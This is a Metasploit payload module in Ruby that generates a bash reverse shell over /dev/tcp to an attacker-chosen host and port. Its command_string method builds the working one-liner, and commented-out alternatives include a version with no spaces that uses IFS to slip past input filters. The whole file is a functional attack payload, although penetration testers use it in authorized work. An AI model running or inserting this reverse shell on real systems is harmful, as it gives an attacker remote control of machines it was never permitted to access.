##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Reverse TCP (/dev/tcp)',
        'Description' => %q{
          Creates an interactive shell via bash's builtin /dev/tcp.

          This will not work on circa 2009 and older Debian-based Linux
          distributions (including Ubuntu) because they compile bash
          without the /dev/tcp feature.
        },
        'Author' => 'hdm',
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShellUnix,
        'PayloadType' => 'cmd_bash',
        'RequiredCmd' => 'bash-tcp',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
    register_advanced_options(
      [
        OptString.new('BashPath', [true, 'The path to the Bash executable', 'bash']),
        OptString.new('ShellPath', [true, 'The path to the shell to execute', 'sh'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    fd = rand(20..219)
    return "#{datastore['BashPath']} -c '0<&#{fd}-;exec #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};#{datastore['ShellPath']} <&#{fd} >&#{fd} 2>&#{fd}'"
    # same thing, no semicolons
    # return "/bin/bash #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} <&#{fd} >&#{fd}"
    # same thing, no spaces
    # return "s=${IFS:0:1};eval$s\"bash${s}#{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']}$s<&#{fd}$s>&#{fd}&\""
  end
end
